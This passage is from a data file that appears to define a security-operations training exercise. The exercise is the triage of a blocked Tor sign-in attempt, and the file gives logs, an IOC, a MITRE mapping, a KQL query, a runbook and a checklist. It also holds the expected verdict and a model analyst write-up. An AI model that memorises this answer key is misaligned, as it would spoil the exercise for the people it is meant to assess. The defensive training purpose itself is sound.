`13:18:44  192.0.2.250  Result: 50126 (invalid password)  Conditional Access: Failure — "Block anonymous IPs"
No other attempts from Tor in 30 days.
Last successful sign-in: 2026-10-06 07:02 from warehouse kiosk 192.0.2.40 (MFA passed)` },
    { tab: "Password check", body:
`Entra leaked-credentials check: no match
Password last changed: 2026-09-01` }
  ],
  iocs: [{ type: "IP", value: "192.0.2[.]250", note: "Tor exit" }],
  mitre: [{ id: "T1090.003", name: "Proxy: Multi-hop Proxy", tactic: "Command and Control" }],
  kql: `SigninLogs
| where TimeGenerated > ago(30d)
| where UserPrincipalName == "sean.doyle@harbourline.example"
| where RiskEventTypes_V2 has "anonymizedIPAddress" or IPAddress == "192.0.2.250"
| project TimeGenerated, IPAddress, ResultType, ConditionalAccessStatus`,
  runbook: [
    "Check the result: did the sign-in succeed?",
    "Check Conditional Access outcome and whether the password was correct.",
    "If blocked, wrong password, single attempt: close, optionally advise the user.",
    "Escalate if it succeeded, the password was correct, or attempts repeat."
  ],
  kb: { id: "SOC-ID-002", title: "Anonymous IP sign-ins" },
  refs: [{ label: "MITRE ATT&CK T1090.003", url: "https://attack.mitre.org/techniques/T1090/003/" }],
  checklist: [
    "Confirmed the sign-in failed",
    "Confirmed Conditional Access blocked it",
    "Checked for repeat attempts",
    "Checked leaked-credential status",
    "Closed with a note"
  ],
  answer: "resolve", classification: "True positive",
  rationale: "One failed, blocked attempt with a wrong password. Controls worked; no compromise.",
  model: {
    short: "Tor sign-in attempt — blocked, wrong password — closed",
    investigation: "Single attempt from Tor exit 192.0.2.250, error 50126 and CA 'Block anonymous IPs' failure. No other Tor attempts in 30 days; no leaked-credential match.",
    actions: "Blocked IP in named locations (already blocked by CA). Sent user a short awareness note.",
    next: "Closed at L1."
  }
}
);
